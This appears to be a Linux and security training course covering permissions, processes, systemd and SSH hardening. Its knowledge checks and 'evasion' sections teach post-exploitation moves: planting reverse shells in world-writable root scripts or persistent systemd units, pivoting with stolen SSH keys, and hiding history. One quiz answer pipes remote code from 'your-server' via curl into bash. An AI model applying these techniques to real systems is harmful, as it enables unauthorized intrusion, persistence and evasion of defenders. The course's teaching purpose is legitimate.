steps.heading: Nine Bits of Trust
steps.body:
Every file and directory on Linux has exactly three audiences: the user who owns it, the group assigned to it, and everyone else. Each audience gets three switches: read, write, execute. Nine bits total — the permission string you see at the far left of `ls -l` output.

That `rwxr-xr--` is not decoration. It is the kernel's access control decision for every single system call touching that file. Open, exec, unlink — all checked against those nine bits before anything happens. Miss them and you are either locking legitimate users out or handing unknown processes more trust than they deserve.

steps.heading: Octal and Symbolic
steps.body:
Two notations describe the same nine bits. Symbolic is human-readable: `u+x` adds execute for the user, `g-w` removes write for the group, `o=r` sets others to read-only. Octal is compact: read=4, write=2, execute=1, summed per audience. Owner rwx is 7, group r-x is 5, others r-- is 4 — so `chmod 754`.

Three special bits sit above the nine. Setuid (s) on an executable runs it as the file's owner. Setgid (s) on a directory makes new files inherit the group. Sticky (t) on a directory means only the owner can delete their own files — that is what protects /tmp from users trampling each other.

`chown` changes ownership. `chown alice:devs file.sh` hands the file to user alice, group devs. Root can give files to anyone; ordinary users can only give files they own to groups they belong to.

steps.heading: Reading and setting permissions
steps.body: The essential workflow: look, interpret, change. Run these on any box until the output is automatic to parse.
steps.code:
# Long listing — permission string is the first column
ls -l /etc/passwd
# -rw-r--r--  1  root  root  2847  ...  /etc/passwd
# ^^^  ^^^  ^^^
# owner=rw-   group=r--   others=r--   (no execute bit — it is a data file)

# Make a script executable by its owner only
chmod u+x deploy.sh

# World-readable, no-write, no-exec — classic config file target
chmod 644 config.yaml       # rw-r--r--

# Restrictive private key permissions — ssh will refuse anything looser
chmod 600 ~/.ssh/id_rsa     # rw------- (owner read/write, nobody else anything)

# Hand ownership to a service account
chown www-data:www-data /var/www/html/index.html

# Recursive chown on a directory tree — useful after a restore
chown -R alice:devs /opt/project

steps.heading: Lock a private key
steps.context: Set permissions on "~/.ssh/id_rsa" to octal mode 600 using "chmod".
steps.code_before:
# SSH just refused your key because the permissions are too open
# sshd enforces that private key files cannot be world-readable
steps.code_after:
# Verify — should show -rw------- in the first column
ls -l ~/.ssh/id_rsa

steps.heading: Special bits in action
steps.body: Setuid, setgid, and sticky — when they appear, they mean something specific. These are the bits that create privilege escalation targets when misconfigured.
steps.code:
# Find ALL setuid binaries on the system — classic priv-esc recon
find / -perm -4000 -type f 2>/dev/null
# -perm -4000 means 'setuid bit is set'; 2>/dev/null silences permission errors

# Set the setgid bit on a shared project directory
# New files created here inherit the group, not the creator's primary group
chmod g+s /opt/shared         # Shows as drwxr-sr-x

# Apply the sticky bit to a world-writable temp area
# Users can only delete files they own
chmod +t /tmp/uploads         # Shows as drwxrwxrwt  (the t at the end)

# Verify — the 's' in group execute means setgid is set
ls -ld /opt/shared

# Remove setuid from a binary that should not have it
chmod u-s /usr/local/bin/suspect_binary

steps.heading: Find setuid binaries
steps.context: Search the filesystem for files with the setuid bit set using "find" with the "/-perm" flag "-4000" and "-type f", silencing errors with "2>/dev/null".
steps.code_before: # You just landed on a box and want potential priv-esc vectors
steps.code_after:
# Review the list carefully — /usr/bin/passwd and /usr/bin/sudo are expected
# Anything custom or unusual in that list deserves scrutiny

steps.heading: Misconfiguration Graveyard
steps.body:
World-writable files in system paths (`chmod 777` on anything that matters) are the entry-level mistake. An attacker who can write to a root-owned script in /etc/cron.daily already has a scheduled privilege escalation. Check with `find / -perm -002 -type f 2>/dev/null`.

Setuid on anything that was not shipped that way by the OS is a red flag. If you find `chmod u+s /usr/local/bin/python3` in a deploy script, that is a root shell waiting to be popped. `sudo -l` on a target box before you even look at file permissions — sudo misconfigurations are faster.

Ownership mismatches matter too. A config file in /etc owned by a non-root user can be written by that user's processes. If a service reads that config as root, you have a trivial injection path. `ls -lan` shows numeric UIDs when names do not resolve — useful when investigating a box with tampered /etc/passwd.

steps.heading: Set world-readable config
steps.context: Set permissions on "config.yaml" to octal 644 using "chmod", giving the owner read-write and everyone else read-only.

# Deploy script is placing a config that services need to read
# but nobody should be able to modify it except the owner

steps.heading: Knowledge Check
steps.question: During a pentest you run `ls -l /usr/local/bin/backup_tool` and see `-rwsr-xr-x  1  root  root`. You own a file that backup_tool reads and includes in its output without sanitizing. What does the 's' in the owner-execute position mean for your attack surface?
options: The binary runs as root regardless of who executes it, so controlling its input can translate to root-level code execution.
The 's' means the binary is setgid, so it runs as the group, not root.
The binary can only be executed by root; the 's' restricts access.
Setuid on a binary means it drops privileges before reading user-controlled files.
steps.hint: The 's' in the owner-execute slot is the setuid bit. Ask yourself whose identity the kernel assigns to the process when it runs.

steps.heading: Processes Are Files
steps.body:
On Linux, every running thing is a process: a unique PID, a parent PID, a set of open file descriptors, and a position in memory. The kernel exposes all of this under `/proc` — literally a directory tree where every subdirectory named by a number is a live process you can inspect by reading files inside it.

Process management is not just system administration. It is reconnaissance. On a box you just landed on, `ps`, `top`, and `/proc` tell you what is running, who owns it, what files it has open, and what network connections it holds. That information shapes every next move.

steps.heading: Signals and States
steps.body:
Processes die on signals. The polite ask is `SIGTERM` (15) — 'please clean up and exit.' The instant kill is `SIGKILL` (9) — the kernel yanks the process immediately, no handler, no flush, no chance to argue. `SIGHUP` (1) conventionally tells a daemon to reload its config. `SIGSTOP` pauses; `SIGCONT` resumes.

A process in state `Z` is a zombie — it exited but its parent has not collected the return code. Zombies hold a PID and a slot in the process table but nothing else; a handful are harmless, thousands indicate a broken parent. State `D` is uninterruptible sleep, usually waiting on I/O. You cannot kill a process in state D — not even with -9. Only the kernel can release it when the I/O resolves.

`grep` is the other half of this module. It filters lines. Every log, every process list, every config file becomes manageable the moment you pipe it through grep.

steps.heading: Inspect and signal
steps.body: The core process commands in the order you reach for them.
steps.code:
# Snapshot of all processes, every user, full path, BSD format
ps aux
# USER  PID  %CPU  %MEM  VSZ  RSS  TTY  STAT  START  TIME  COMMAND

# Show process tree — parent-child relationships as ASCII art
ps auxf                         # Indented children under their parents

# Top — live CPU/memory, refreshes every 2s. q to quit, k to kill by PID.
top                              # Interactive; most people use htop if installed

# Send SIGTERM to a process by name (kills all processes with that name)
killall nginx

# Polite kill by PID
kill 1234                        # Sends SIGTERM (15) by default

# Instant kill — no handler, no mercy
kill -9 1234                     # SIGKILL; use when SIGTERM is ignored

# Find PID of a named process without parsing ps
pgrep sshd                       # Returns PID(s), cleaner than grep

steps.context: Find the PID of "sshd" by running "pgrep" followed by the process name "sshd".

steps.heading: Grep essentials
steps.body: Grep reads from files or stdin and prints every line that matches. These patterns cover ninety percent of real usage.
steps.code:
# Find lines containing 'error' in a log (case-insensitive)
grep -i 'error' /var/log/syslog

# Recursive search — every file under /etc for the string 'PasswordAuth'
grep -r 'PasswordAuth' /etc/           # Find config directives across a tree

# Print line numbers alongside matches — useful when you need to reference lines
grep -n 'root' /etc/passwd

# Invert match — print lines that do NOT contain a string
grep -v '^#' /etc/ssh/sshd_config     # Strip comments, see live config only

# Extended regex: match lines with 'fail' OR 'error'
grep -E 'fail|error' /var/log/auth.log

# Count matching lines — how many login failures today?
grep -c 'Failed password' /var/log/auth.log

# Chain with ps — find a process without the grep PID noise
ps aux | grep '[n]ginx'               # The bracket trick excludes grep itself

steps.heading: Strip config comments
steps.context: Print only non-comment lines from "/etc/ssh/sshd_config" by running "grep" with the invert flag "-v" and the pattern "'^#'".
steps.code_before:
# You want to see the actual active configuration
# without wading through comment lines
steps.code_after:
# Pipe through grep again to find a specific directive
# grep -v '^#' /etc/ssh/sshd_config | grep 'PermitRoot'

steps.heading: Recon and Evasion
steps.body:
In an offensive context the process list is a goldmine. Look for: EDR agents (CrowdStrike, Carbon Black, Sentinel One processes), backup agents that run as root, monitoring daemons, and processes with unusual parent chains. A web shell spawned by Apache will show up as `apache2` spawning `bash` — that parent-child anomaly is the blue team's detection signal and your visibility warning.

Avoid `kill -9` on production systems during a pentest unless you have explicit permission to cause a service outage. `SIGTERM` first, wait two seconds, then escalate if needed. Killing the wrong PID because `ps aux | grep python` matched something unexpected is an embarrassing incident report.

Grep performance: `grep -F` for fixed strings is faster than regex when you do not need patterns. On multi-gigabyte logs, `ripgrep` is orders of magnitude quicker. And `-l` prints only filenames of matching files — use it in recursive searches when you just need to know which file to open, not every matching line.

steps.heading: Count failed logins
steps.context: Count lines containing "Failed password" in "/var/log/auth.log" by running "grep" with the count flag "-c" and that exact string.
steps.code_before: # Incident response: how many failed SSH attempts on this box?
steps.code_after:
# Follow up: see WHICH accounts are targeted
grep 'Failed password' /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -rn

steps.heading: Knowledge Check
steps.question: You land a reverse shell under www-data. You run `ps aux` and notice a process `/usr/bin/python3 /opt/monitor/check.py` running as root, started 4 days ago. You inspect the file and see it is world-writable. What is the cleanest next step?
options: Write a reverse shell payload into check.py and wait for the next execution cycle, or trigger it if you can identify what restarts it.
Kill the python process with kill -9 to free up a root process slot.
Use grep to search check.py for passwords and pivot laterally.
Run the script manually as www-data to see what it outputs.
steps.hint: World-writable plus root execution is a privilege escalation primitive. You do not need to run it yourself — you need to control what it runs next time root does.

steps.heading: PID 1 Has Opinions
steps.body:
When the Linux kernel finishes booting it hands control to a single process: PID 1, the init system. For the last decade on most distributions, that means systemd. Systemd is simultaneously the process supervisor, the logging daemon, the socket activator, the timer scheduler, and whatever else its author thought would be convenient that week.

Love it or despise it, you will encounter it on every Debian, Ubuntu, Red Hat, Fedora, Arch, and CentOS box you touch. Knowing how to start, stop, enable, inspect, and abuse systemd services is non-negotiable for both administration and post-exploitation.

steps.heading: Units and Targets
steps.body:
Systemd organizes everything into units. A service unit (.service) describes a daemon: what binary to run, what user to run it as, when to restart it. A socket unit (.socket) handles socket activation. A timer unit (.timer) replaces cron. A target (.target) is a group of units, equivalent to the old runlevels — `multi-user.target` is the standard non-GUI boot state.

Unit files live in two key places. Vendor-supplied units land in `/usr/lib/systemd/system/`. Local customizations and anything you create go in `/etc/systemd/system/` — files here override the vendor ones with the same name. When you `systemctl enable`, systemd creates a symlink in the appropriate target's wants directory, which is why it survives reboots.

The journal is systemd's log — `journalctl` reads it. Every unit's output goes there by default, timestamped, associated with the unit name. It is the first place to look when a service misbehaves.

steps.heading: Daily service workflow
steps.body: The six commands you reach for every single time you interact with a running service.
steps.code:
# Check whether a service is running, its last log lines, and exit codes
systemctl status nginx

# Start a service now (does not persist across reboot)
systemctl start nginx

# Stop it cleanly (sends SIGTERM, waits, then SIGKILL)
systemctl stop nginx

# Enable: create the symlink so the service starts on next boot
systemctl enable nginx

# Enable AND start in one shot — the flag you actually want in scripts
systemctl enable --now nginx

# Disable: remove the symlink (does not stop the running instance)
systemctl disable nginx

# Reload the service config without interrupting connections
systemctl reload nginx         # Only works if the service supports SIGHUP

# Full restart — stop then start. Causes a connection gap.
systemctl restart nginx

steps.heading: Start and persist
steps.context: Enable the "nginx" service AND start it immediately by running "systemctl enable" with the "--now" flag followed by "nginx".
steps.code_before: # You just deployed nginx and want it running now and after every reboot
steps.code_after:
# Confirm it took
systemctl status nginx

steps.heading: Journalctl for logs
steps.body: The journal is structured and queryable. You almost never need to grep /var/log directly when systemd owns the service.
steps.code:
# All logs for a unit, most recent at the bottom
journalctl -u nginx

# Follow live log output — equivalent to tail -f for a service
journalctl -u nginx -f

# Logs since the last boot only
journalctl -u nginx -b

# Logs since a specific time — incident response staple
journalctl -u ssh --since "2024-01-15 03:00:00" --until "2024-01-15 04:00:00"

# Kernel ring buffer logs — useful after crashes or hardware events
journalctl -k

# See how much disk space the journal is consuming
journalctl --disk-usage

# Vacuum old journal entries to free space
journalctl --vacuum-time=7d    # Keep only the last 7 days

steps.heading: Tail a service live
steps.context: Follow the live log output of the "ssh" unit using "journalctl" with the "-u" flag and "-f" flag.
steps.code_before:
# You are watching an SSH login attempt in real time
# and want to see journal entries as they arrive

steps.heading: Persistence via systemd
steps.body:
From an offensive perspective, systemd is a persistence goldmine. A malicious .service file in `/etc/systemd/system/` with `WantedBy=multi-user.target` survives every reboot and restarts on failure. Defenders rarely check unit files they did not write. `systemctl list-units --type=service` lists everything, but `systemctl list-unit-files | grep enabled` narrows it to what actually launches at boot.

Service hardening is where most installations are weakest. Default service units often run as root with no restrictions. A hardened unit uses `User=`, `Group=`, `CapabilityBoundingSet=`, `NoNewPrivileges=true`, `ProtectSystem=strict`, and `PrivateTmp=true`. Running `systemd-analyze security nginx` gives a hardening score and itemizes every missing restriction. A score of 'EXPOSED' on a public-facing service is a finding worth noting.

Timer units replaced cron for anything new on systemd systems. Check `systemctl list-timers` the same way you check crontabs during recon — it shows the next trigger time for every scheduled unit on the box.

steps.heading: Audit enabled services
steps.context: List all unit files filtered to only the "enabled" ones by running "systemctl list-unit-files" piped into "grep enabled".
steps.code_before:
# You need to see what launches at boot on this box
# looking for anything that should not be there
steps.code_after:
# Investigate any unit names you do not recognize
# systemctl cat <unit_name> to read the unit file

steps.heading: Knowledge Check
steps.question: You have root on a box and want a reverse shell that survives reboots, restarts if killed, and blends in among legitimate services. Which approach achieves this most reliably?
options: Write a .service unit file to /etc/systemd/system/ with Restart=always and WantedBy=multi-user.target, then run systemctl enable --now on it.
Add a line to /etc/rc.local that executes the shell binary in the background.
Create a cron job under root's crontab with @reboot.
Place the binary in /usr/local/bin/ and rely on PATH execution.
steps.hint: Consider which mechanism provides automatic restart on failure, clean boot integration, and is least likely to be audited by defenders scanning for obvious persistence techniques.

steps.heading: Passwords Are the Problem
steps.body:
Password-based SSH authentication has three failure modes that key auth does not. Users pick weak passwords. Passwords get phished. Automated credential stuffing attacks hit SSH on port 22 continuously, from thousands of IPs, all day, every day. Open any public-facing server's auth.log and count the failed password lines — it reads like a war zone.

Key authentication flips the model. The private key never leaves your machine. The server stores only the public key, which is mathematically useless without the private half. There is nothing to phish, nothing to brute-force, and nothing to leak in a password reset flow. Add a passphrase to your private key and you have two-factor authentication without buying a YubiKey.

steps.heading: The Handshake
steps.body:
When you connect, the server presents its host key. Your SSH client checks it against `~/.ssh/known_hosts` — if the fingerprint is new, it warns you; if it changed, it refuses loudly. That check is your only protection against an MitM swapping in a different server. Ignore 'host key changed' warnings exactly never.

Then your client proves it holds the private key corresponding to an entry in the server's `~/.ssh/authorized_keys`. The server sends a challenge encrypted with your public key; only the holder of the private key can decrypt it and sign the response. No password crosses the wire at any point.

The hardenable defaults in `/etc/ssh/sshd_config` are what separate a server from a liability. PasswordAuthentication, PermitRootLogin, and the choice of ciphers and MACs are the three levers most administrators never touch after initial setup.

steps.heading: Key generation and deployment
steps.body: Two commands to set up key auth. One to harden the server. This is the full workflow.
steps.code:
# Generate an Ed25519 keypair — smaller, faster, and more secure than RSA 2048
# -C adds a comment to the public key for identification
ssh-keygen -t ed25519 -C "alice@workstation"
# Saves private key to ~/.ssh/id_ed25519, public to ~/.ssh/id_ed25519.pub

# Copy the public key to a remote server in one command
# Appends to authorized_keys and handles permissions automatically
ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@192.168.1.50

# Manual equivalent if ssh-copy-id is not available
cat ~/.ssh/id_ed25519.pub | ssh alice@192.168.1.50 \
  'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'

# Verify key-based auth works BEFORE disabling passwords
ssh -i ~/.ssh/id_ed25519 alice@192.168.1.50

# Connect using a specific identity file explicitly
ssh -i ~/.ssh/pentest_key user@target.host

steps.heading: Generate an Ed25519 key
steps.context: Generate an Ed25519 SSH keypair with the comment "alice@workstation" by running "ssh-keygen" with "-t ed25519" and "-C" flags.
steps.code_before: # Set up key-based auth before hardening the server to disable passwords
steps.code_after:
# The private key lives at ~/.ssh/id_ed25519
# The public key at ~/.ssh/id_ed25519.pub

steps.heading: Hardening sshd_config
steps.body: The directives that matter. Change these, reload the daemon, then test from a second terminal before closing your current session — locking yourself out is a rite of passage you only need once.
steps.code:
# /etc/ssh/sshd_config — directives that reduce attack surface

# Disable interactive password authentication entirely
PasswordAuthentication no

# Root should never log in directly — use a non-root user and sudo
PermitRootLogin no

# Only allow specific users or groups to authenticate
AllowUsers alice deploy
# AllowGroups sshusers

# Idle timeout: disconnect if no data received for 300s, after 2 checks
ClientAliveInterval 300
ClientAliveCountMax 2

# Limit the authentication window — reduce brute force exposure
LoginGraceTime 30

# Disable legacy forwarding unless you specifically need it
X11Forwarding no

# Apply without interrupting existing sessions
# Run: systemctl reload sshd

steps.heading: Disable password auth
steps.context: In sshd_config set the directive "PasswordAuthentication" to "no" by writing that exact key-value pair on one line.
steps.code_before:
# /etc/ssh/sshd_config
# Make sure key-based auth is working before saving this
steps.code_after:
PermitRootLogin no
# Reload: systemctl reload sshd

steps.heading: Key Management Hygiene
steps.body:
Per-host or per-role key pairs — not one key for everything. When a key is compromised you want to revoke exactly the affected access, not rotate credentials to a hundred servers simultaneously. Name keys meaningfully: `id_ed25519_prod_deploy`, not `id_ed25519_2`. Document what each key has access to.

Authorized_keys entries support restrictions. `command="/usr/bin/backup_only"` limits a key to executing a single command. `no-port-forwarding,no-X11-forwarding,from="10.0.0.0/8"` locks a key to a source network and strips tunnel capabilities. These options are on the authorized_keys line, not in sshd_config, so they travel with the key.

From an offensive perspective, `~/.ssh/authorized_keys` on a compromised box tells you what other machines trust this one. Private keys in `~/.ssh/` tell you where this user can go. The combination of both, plus `~/.ssh/config` for host aliases, often maps an entire internal network. Always check those files on a box you have access to.

steps.heading: Copy key to remote host
steps.context: Deploy your Ed25519 public key to user alice at 192.168.1.50 by running "ssh-copy-id" with "-i ~/.ssh/id_ed25519.pub" and "alice@192.168.1.50".

# Keypair is generated; now push the public key to the server
# ssh-copy-id handles authorized_keys permissions automatically
steps.code_after:
# Verify before disabling passwords
ssh -i ~/.ssh/id_ed25519 alice@192.168.1.50

steps.heading: Knowledge Check
steps.question: During a pentest you compromise a low-privilege web server. Inside the web app user's home directory you find `~/.ssh/id_ed25519` with permissions 600 and `~/.ssh/config` containing entries for `db-server`, `backup-server`, and `ci-server` with matching IdentityFile paths. The key has no passphrase. What is the immediate high-value action?
options: Attempt to SSH to each host in the config using the recovered private key to determine which servers trust this identity.
Delete the private key to prevent the legitimate user from connecting and retaining access.
Add your own public key to authorized_keys to establish persistence before investigating further.
Run ssh-keygen to extract the public key and search for it in authorized_keys on the local machine.
steps.hint: A private key plus a config file naming specific destinations is a ready-made map. The config tells you where the key goes; the key lets you in. What is the fastest way to turn that into confirmed access?

steps.heading: Recon Is Just Questions
steps.body:
Every pentest starts the same way: you know an IP or a hostname and nothing else. Automated recon is the process of asking every question you can without triggering alarms — open ports, running services, kernel version, active users, SUID binaries, world-writable paths, scheduled jobs, listening sockets. Not all in one noisy burst, but systematically, in a script you can hand off and rerun.

A recon script is not fancy. It is a Bash file that runs a checklist and saves the output so you can read it later. The value is in asking every question every time, never forgetting a step because you were tired.

steps.heading: Bash Script Anatomy
steps.body:
A Bash script is a file of shell commands with one piece of ceremony: the shebang on line one tells the kernel which interpreter to use. `#!/bin/bash` is the standard; `#!/usr/bin/env bash` is more portable if bash lives somewhere unusual.

A few constructs carry most of the load. Variables: `NAME=value` (no spaces around `=`) and `$NAME` to expand. Command substitution: `$(command)` captures output into a variable or inline expression. Conditionals: `if [ condition ]; then ... fi`. Loops: `for item in list; do ... done`. Functions: `function_name() { commands; }` — call them like commands, pass arguments as `$1`, `$2`.

Output organization matters. `echo` for labels. Redirecting into a report file with `>>`. The here-string `<<EOF` for multi-line output blocks. ANSI color codes for headers so a human can scan the result in 30 seconds. And always `2>/dev/null` on commands that will spam permission-denied errors — clean output is readable output.

steps.heading: Script skeleton
steps.body: The frame every recon script hangs on: shebang, color codes, output file, section-header function, and the first section already filled in.
steps.code:
#!/bin/bash
# recon.sh — local host reconnaissance script
# Usage: ./recon.sh [output_file]

# ANSI escape codes for color headers
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'   # No Color — reset

# Output destination: arg 1 or default to ./recon_output.txt
OUTFILE="${1:-recon_output.txt}"

# Truncate/create the output file
> "$OUTFILE"

# Section header function — DRY, consistent formatting
section() {
  echo -e "\n${RED}[+] $1${NC}" | tee -a "$OUTFILE"
  echo "-----------------------------" >> "$OUTFILE"
}

# --- SYSTEM OVERVIEW ---
section "System Information"
uname -a        >> "$OUTFILE"
hostname        >> "$OUTFILE"
cat /etc/os-release >> "$OUTFILE"

steps.heading: Append a command output
steps.context: Append the output of "id" to the report file variable "$OUTFILE" using the append redirect operator ">>".

steps.heading: Core recon sections
steps.body: The meat of the script: users, network, processes, and the two privilege-escalation classics.
steps.code:
#!/bin/bash
OUTFILE="recon_output.txt"
section() { echo -e "\n[+] $1" | tee -a "$OUTFILE"; }

# --- USERS AND AUTH ---
section "Local Users (passwd)"
cut -d: -f1,3,7 /etc/passwd >> "$OUTFILE"   # username:UID:shell

# --- NETWORK ---
section "Listening Sockets"
ss -tlnup 2>/dev/null >> "$OUTFILE"          # TCP+UDP listening, no DNS lookup

# --- PROCESSES ---
section "Running Processes"
ps auxf 2>/dev/null >> "$OUTFILE"

# --- PRIVILEGE ESCALATION SURFACE ---
section "SUID Binaries"
find / -perm -4000 -type f 2>/dev/null >> "$OUTFILE"

section "World-Writable Files in PATH Dirs"
for dir in $(echo $PATH | tr ':' ' '); do
  find "$dir" -maxdepth 1 -perm -002 -type f 2>/dev/null
done >> "$OUTFILE"

section "Crontabs"
cat /etc/crontab 2>/dev/null >> "$OUTFILE"
ls -la /etc/cron.* 2>/dev/null >> "$OUTFILE"

steps.heading: List listening sockets
steps.context: Append the output of "ss" with flags "-tlnup" and error suppression "2>/dev/null" to the file "$OUTFILE".

steps.heading: Noise and Evasion
steps.body:
A recon script run locally on a box you have already compromised is quiet by nature — you are not sending packets anywhere. The concern is forensic: your script creates a file on disk, your commands appear in bash history, and your process list shows up in `ps` for any monitoring agent watching.

Mitigations: run with `HISTFILE=/dev/null` prepended to suppress history. Write output to `/dev/shm/` (a tmpfs mount, memory-only, cleared on reboot) rather than a disk path. Use `bash -c 'commands'` piped from stdin to avoid writing a file to disk at all. And exfil the output immediately if you intend to leave — a recon file sitting in /tmp is evidence.

On the blue-team side, the same script run nightly as a baseline and compared to yesterday's output is a primitive but effective tripwire. New SUID binary? New cron entry? New user account? Delta report, page on-call. Simple tools used consistently beat fancy tools used inconsistently.

steps.heading: SUID binary search
steps.context: Find all setuid files on the system by running "find" with "/" as the path, "-perm -4000", "-type f", and "2>/dev/null", appending to "$OUTFILE".

steps.heading: Knowledge Check
steps.question: You finish writing your recon script and want to run it on a target in a way that leaves no file artifact on disk and does not record the command in bash history. The target has curl and bash available. Which invocation achieves both goals?
options: HISTFILE=/dev/null bash -c "$(curl -s http://your-server/recon.sh)" > /dev/shm/out.txt
chmod +x recon.sh && ./recon.sh > /tmp/out.txt
scp recon.sh target:/tmp/ && ssh target bash /tmp/recon.sh
cat recon.sh | tee /var/log/recon.sh | bash
steps.hint: Two requirements: no file written to disk, no history entry. Which option satisfies both simultaneously, and where does the output land that survives only in memory?
